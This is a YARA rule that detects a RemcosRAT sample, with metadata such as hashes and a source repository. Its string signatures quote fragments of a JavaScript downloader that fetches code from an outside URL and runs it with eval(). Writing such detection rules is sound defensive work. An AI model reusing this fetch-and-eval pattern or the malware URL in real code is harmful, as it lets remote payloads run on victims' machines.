rule MULTI_Sample_RemcosRAT_526c7ef0
{
    meta:
        author = "Marjoriefort"
        description = "Detects RemcosRAT (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "526c7ef03783d60a7466a555b59f0f662f1abd533ced35f8a1d99df0832b88bc"
        yarahub_uuid = "c441b2ed-aa17-42db-9c6f-a5404be33ca3"
        famille = "RemcosRAT"
        famille_source = "reputation"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "5d4100730503f9b021e48186789ca5fd"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "var entailer = \"http://maciejbi.hosting24.pl/006sK41x\";" wide ascii
        $s1 = "dighted.open(\"GET\", entailer, false);" wide ascii
        $s2 = "var armorial = dighted.responseText;" wide ascii
        $s3 = "dighted.send();" wide ascii
        $s4 = "eval(armorial);" wide ascii
    condition:
        true and filesize < 50MB and 3 of ($s1, $s2, $s3, $s4) and 1 of ($s0)
}
